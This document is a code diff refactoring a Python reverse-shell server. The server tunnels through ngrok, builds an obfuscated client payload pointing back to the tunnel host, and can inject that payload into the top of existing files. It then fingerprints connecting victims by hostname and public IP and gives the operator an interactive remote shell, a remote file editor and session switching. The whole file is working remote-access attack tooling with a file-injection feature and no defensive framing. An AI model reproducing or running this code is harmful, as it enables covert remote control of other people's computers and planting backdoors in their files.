@@ -1,173 +1,182 @@
 #!/usr/bin/python3
+from __future__ import annotations
+
 import base64
 import os
 import sys
 import cmd
-import time
 import socket
 import tempfile
-import requests
 import threading
+import requests
 
-print_sys = print
-from rich import print
-from typing import Optional, Any, Tuple, List
-
-with open(os.path.join(__file__.rsplit('/', 2)[0], 'client.py')) as file:
-    PAYLOAD = file.read()
-while ' ':
-    check_platform_name = os.popen('lsb_release -i').read().lower()
-    if 'ubuntu' in check_platform_name:
-        os.system(r'gnome-terminal -e "bash -c \"ngrok tcp 4444; exec bash\""')
-        time.sleep(1)
-    try:
-        req = requests.get('http://localhost:4040/api/tunnels').json()['tunnels'][0]
-        break
-    except requests.exceptions.ConnectionError:
-        input('\n# please open a tcp port on ngrok\n   and click [Enter] ')
+from rich.console import Console
+from threading import Lock
+from typing import Tuple
 
 HEADER: int = 64
 SEND_BYTES = 1024
-PAYLOAD_SERVER: str = req['public_url'].replace('tcp://', '').split(':')[0]
-PAYLOAD_PORT: int = req['public_url'].split(':')[2]
-SERVER, PORT = req['config']['addr'].split(':')
-ADDR: Tuple[str, int] = (SERVER, int(PORT))
 FORMAT: str = 'utf-8'
 DISCONNECT_MESSAGE: str = "!DISCONNECT"
-
-server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    server.bind(ADDR)
-except OSError:
-    exit("# Address already in use")
-
-clients = set()
-clients_lock = threading.Lock()
+CLIENTS = set()
+CLIENTS_LOCK: Lock = threading.Lock()
+console = Console()
 
 
-class BaseShell(cmd.Cmd):
+class Ngrok:
+    def __init__(self):
+        while ' ':
+            try:
+                self.res = requests.get('http://localhost:4040/api/tunnels').json()['tunnels'][0]
+                break
+            except requests.exceptions.ConnectionError:
+                input('\n# please open a tcp port on ngrok\n   and click [Enter] ')
+
+    @property
+    def ADDR(self) -> Tuple[str, int]:
+        server_name, port = self.res['config']['addr'].split(':')
+        return server_name, int(port)
+
+    @property
+    def PAYLOAD_SERVER(self) -> str:
+        return self.res['public_url'].replace('tcp://', '').split(':')[0]
+
+    @property
+    def PAYLOAD_PORT(self) -> int:
+        return self.res['public_url'].split(':')[2]
+
+    @property
+    def PAYLOAD_CONTENT(self) -> str:
+        with open(os.path.join(__file__.rsplit('/', 2)[0], 'client.py')) as file:
+            data = file.read()
+        return data
+
+
+class AccessShell(cmd.Cmd):
+    is_active: bool = False
+
     def __init__(self, *args, **kwargs):
-        sys.stdout.write("\r")
-        super(BaseShell, self).__init__(*args, **kwargs)
+        super(AccessShell, self).__init__(*args, **kwargs)
+        self.client = None
 
-    def cmdloop(self, custom_prompt, conn, addr, intro: Optional[Any] = ...) -> None:
-        self.conn: object = conn
-        self.addr: int = addr
-        self.prompt = f"({custom_prompt}) $ "
-        super(BaseShell, self).cmdloop(intro=intro)
-
-    def default(self, line: str) -> ...:
-        self.send(self.conn, line)
-        data = self.read_str()
+    def default(self, line: str):
+        data: str = self.send_data(self.client, line)
         if data:
-            print_sys(data)
+            print(data)
 
     def emptyline(self):
-        """Called when an empty line is entered in response to the prompt.
-        If this method is not overridden, it repeats the last nonempty
-        command entered.
-        """
         return None
 
-    def completenames(self, text: str, *ignored) -> List[str]:
-        packages: List[str] = super(
-            BaseShell, self
-        ).completenames(text, *ignored)
-
-        packages += [
-            # add linux commands to shell
-            a for a in os.listdir(os.environ['SHELL'].rsplit('/', maxsplit=1)[0])
-            if a.startswith(text)
-        ]
-        return list(set(packages))
-
-    def do_quit(self, arg: str) -> bool:
-        for client in clients:
-            self.send(client[1], DISCONNECT_MESSAGE)
+    def do_quit(self, arg: str):
+        for client in CLIENTS:
+            self.send_data(client[1], DISCONNECT_MESSAGE)
             client[1].close()
-        clients.clear()
-        cmdloop_status = False
+        CLIENTS.clear()
+        self.is_active = False
         print(f"# Press [ ctrl + c ] to kill the server...")
         exit(0)
 
-    def do_clear(self, arg: str) -> ...:
+    def do_clear(self, arg: str):
         os.system('clear')
 
     def do_nano(self, arg: str):
-        self.send(
-            self.conn,
+        data: str = self.send_data(
+            self.client,
             f"python3 -c \"data = 'x = open(\\'{arg}\\',\\'r\\');print (x.read());x.close()';exec('try:\\n \'+data+\'\\nexcept:pass')\""
         )
-        data = self.read_str()
-        if ": Is a directory" in data:
-            print(data)
-        else:
-            with open(temp_file := os.path.join(tempfile.gettempdir(), arg), 'w') as file:
-                file.write(data)
-            os.system(f'nano {temp_file}')
-            with open(temp_file, 'r') as file:
-                self.send(self.conn,
-                          'echo "{file_data}" > {arg}'.format(file_data=file.read().replace('"', r'\"'), arg=arg))
-                print(self.read_str())
+
+        with open(temp_file := os.path.join(tempfile.gettempdir(), arg), 'w') as file:
+            file.write(data)
+        os.system(f'nano {temp_file}')
+        with open(temp_file, 'r') as file:
+            print(self.send_data(self.client,
+                                 'echo "{file_data}" > {arg}'.format(file_data=file.read().replace('"', r'\"'),
+                                                                     arg=arg)))
 
     def do_clients(self, arg: str) -> ...:
-        for index, client in enumerate(clients):
-            print(f"{index} [green]{client[0]}[/green]")
+        for index, client in enumerate(CLIENTS):
+            console.print(f"{index} [green]{client[0]}[/green]")
 
     def do_session(self, arg: str) -> ...:
-        if arg.strip().isdigit() and int(arg) in range(0, len(clients)):
-            self.conn: object = list(clients)[int(arg)][1]
-            self.prompt = f"({list(clients)[int(arg)][0]}) $ "
+        if arg.strip().isdigit() and int(arg) in range(0, len(CLIENTS)):
+            self.client: socket.socket = list(CLIENTS)[int(arg)][1]
+            self.prompt = f"({list(CLIENTS)[int(arg)][0]}) $ "
         else:
             print('# [red]Session not found![/red]')
 
+    def send_data(self, client, line) -> str:
+        pass
 
-class ShellServer(BaseShell):
-    cmdloop_status: bool = False
 
-    def send(self, client, msg):
-        # to send commands to the client.
-        message: bytes = msg.encode(FORMAT)
-        msg_length: int = len(message)
-        send_length: bytes = str(msg_length).encode(FORMAT)
-        send_length += b' ' * (HEADER - len(send_length))
+class Server(AccessShell):
+    def __init__(self, *args, **kwargs):
+        super(AccessShell, self).__init__(*args, **kwargs)
+        self.ngrok = Ngrok()
+        self.server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            client.send(send_length)
+            self.server.bind(self.ngrok.ADDR)
+        except OSError:
+            exit("# Address already in use")
+        self.create_payload()
+
+    def send_data(self, client: socket.socket, data: str) -> str:
+        """
+        This function send data to the client
+        and waiting for replay then return the data as string.
+        """
+        # send the data to the client.
+        data: bytes = data.encode(FORMAT)
+        data_length: bytes = str(len(data)).encode(FORMAT).strip()
+        data_length += b' ' * (HEADER - len(data_length))
+        try:
+            client.send(data_length)
             while True:
-                if len(message) > SEND_BYTES:
-                    client.send(message[:SEND_BYTES])
-                    message = message[SEND_BYTES:]
+                if len(data) > SEND_BYTES:
+                    client.send(data[:SEND_BYTES])
+                    data = data[SEND_BYTES:]
                 else:
-                    client.send(message)
+                    client.send(data)
                     break
 
         except BrokenPipeError:
-            print('# Session Status is [red]offline[/red]!')
+            console.out("# [red]The server can't send data to the client![/red]")
+            return ""
 
-    def read_str(self) -> str:
-        msg_length = self.conn.recv(HEADER).decode(FORMAT)
-        if msg_length:
-            try:
-                msg_length = int(msg_length)
-            except:
-                return ''
-            data = self.conn.recv(msg_length).decode(FORMAT)
-            if len(data) == msg_length:
+        # receive and listen for the data from the client.
+        data_length: str = client.recv(HEADER).decode(FORMAT).strip()
+        if data_length and data_length.isdigit():
+            data_length: int = int(data_length)
+            data: str = client.recv(data_length).decode(FORMAT)
+            if len(data) == data_length:
                 return data
             else:
-                while not len(data) == msg_length:
-                    data += self.conn.recv(msg_length - len(data)).decode(FORMAT)
-                print_sys(msg_length)
-                print_sys(len(data))
+                while not len(data) == data_length:
+                    data += client.recv(data_length - len(data)).decode(FORMAT)
                 return data
-        return ''
+        return ""
 
-    def handle_client(self, custom_prompt, conn, addr):
-        if not self.cmdloop_status:
-            print(f"# new connection...")
-            print_sys(f"# {addr} connected.\n")
-            self.cmdloop_status = True
-            self.cmdloop(custom_prompt, conn, addr)
+    def handle_clients(self, custom_prompt, client: socket.socket):
+        if not self.is_active:
+            console.out(f"# {custom_prompt} connected.\n")
+            self.is_active = True
+            self.client: socket.socket = client
+            self.prompt = f"({custom_prompt}) $ "
+            self.cmdloop()
+
+    def start(self):
+        self.server.listen()
+        print(f"# Server is listening on {socket.gethostbyname(self.ngrok.PAYLOAD_SERVER)}")
+        while True:
+            try:
+                client, addr = self.server.accept()
+            except KeyboardInterrupt:
+                self.server.close()
+                break
+            data = self.send_data(client, "echo $(uname -n)@$(curl -s https://api.ipify.org)")
+            with CLIENTS_LOCK:
+                CLIENTS.add((data, client))
+            thread = threading.Thread(target=self.handle_clients, args=(data, client))
+            thread.start()
 
     def create_payload(self):
         def compile_data(code):
@@ -180,7 +189,8 @@ class ShellServer(BaseShell):
                 with open(file, 'r') as file_r:
                     content = file_r.read()
                 with open(file, 'w') as f:
-                    _payload = PAYLOAD.format(injection=True, port=PAYLOAD_PORT, host=f'"{PAYLOAD_SERVER}"')
+                    _payload = self.ngrok.PAYLOAD_CONTENT.format(injection=True, port=self.ngrok.PAYLOAD_PORT,
+                                                                 host=f'"{self.ngrok.PAYLOAD_SERVER}"')
                     _payload = compile_data(_payload)
                     if not _payload in content:
                         f.write(_payload + f'\n{content}')
@@ -191,41 +201,10 @@ class ShellServer(BaseShell):
                 exit(-1)
         else:
             with open('client.py', 'w') as f:
-                f.write(compile_data(PAYLOAD.format(injection=False, port=PAYLOAD_PORT, host=f'"{PAYLOAD_SERVER}"')))
-
-    def start(self):
-        server.listen()
-        print(f"# Server is listening on {socket.gethostbyname(PAYLOAD_SERVER)}")
-        while True:
-            try:
-                conn, addr = server.accept()
-            except KeyboardInterrupt:
-                server.close()
-                break
-            message: bytes = "echo $(uname -n)@$(curl -s https://api.ipify.org)".encode(FORMAT)
-            msg_length: int = len(message)
-            send_length: bytes = str(msg_length).encode(FORMAT)
-            send_length += b' ' * (HEADER - len(send_length))
-            conn.send(send_length)
-            conn.send(message)
-            msg_length = conn.recv(HEADER).decode(FORMAT)
-            msg_length = int(msg_length)
-            data = conn.recv(msg_length).decode(FORMAT)
-            clients.add((data, conn))
-            thread = threading.Thread(target=self.handle_client, args=(data, conn, addr))
-            thread.start()
+                f.write(compile_data(self.ngrok.PAYLOAD_CONTENT.format(injection=False, port=self.ngrok.PAYLOAD_PORT,
+                                                                       host=f'"{self.ngrok.PAYLOAD_SERVER}"')))
 
 
 if __name__ == '__main__':
-    Server = ShellServer()
-    try:
-        Server.create_payload()
-        Server.start()
-    except Exception as err:
-        print(err)
-        for client in clients:
-            Server.send(client[1], DISCONNECT_MESSAGE)
-            client[1].close()
-        server.close()
-        print("# Server [red]stoped[/red]!")
-        exit(1)
+    server = Server()
+    server.start()
